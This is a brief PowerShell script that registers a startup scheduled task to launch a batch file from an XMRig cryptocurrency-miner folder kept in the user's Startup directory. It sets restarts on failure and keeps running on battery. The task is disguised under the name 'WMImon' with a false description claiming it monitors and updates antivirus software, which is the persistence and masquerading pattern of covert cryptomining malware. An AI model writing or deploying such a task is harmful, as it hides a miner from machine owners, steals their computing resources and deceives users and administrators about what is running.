# Define the trigger (run at system startup)
Set-Variable -Name Trigger -Value (New-ScheduledTaskTrigger -AtStartup)

# Define the action (execute the batch script for XMRig)
Set-Variable -Name Action -Value (New-ScheduledTaskAction -Argument "/c C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xmrig-6.22.2\w.bat" -Execute "cmd.exe")

# Define the task settings
Set-Variable -Name Settings -Value (New-ScheduledTaskSettingsSet -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 7) -RestartCount 5 -DontStopIfGoingOnBatteries)

# Register the task
Register-ScheduledTask -Settings $Settings -Action $Action -Trigger $Trigger -Description "Monitor and update Antivirus if any error occurs." -TaskName "WMImon"
